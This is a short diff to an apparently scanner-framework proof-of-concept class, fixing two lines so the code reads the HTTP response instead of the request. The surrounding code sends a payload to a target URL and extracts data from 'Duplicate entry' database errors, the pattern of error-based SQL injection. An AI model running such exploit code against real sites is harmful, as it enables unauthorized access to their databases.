@@ -59,7 +59,7 @@ class Poc(ABPoc):
 
             request = urllib.request.Request(attack_url, payload)
             response = urllib.request.urlopen(request)
-            content = request.read()
+            content = response.read()
             reg = re.compile('Duplicate entry (.*?) for key')
             res = reg.findall(content)
 
@@ -82,7 +82,7 @@ class Poc(ABPoc):
 
             request = urllib.request.Request(attack_url, payload)
             response = urllib.request.urlopen(request)
-            content = request.read()
+            content = response.read()
             reg = re.compile('Duplicate entry (.*?) for key')
             res = reg.findall(content)
 
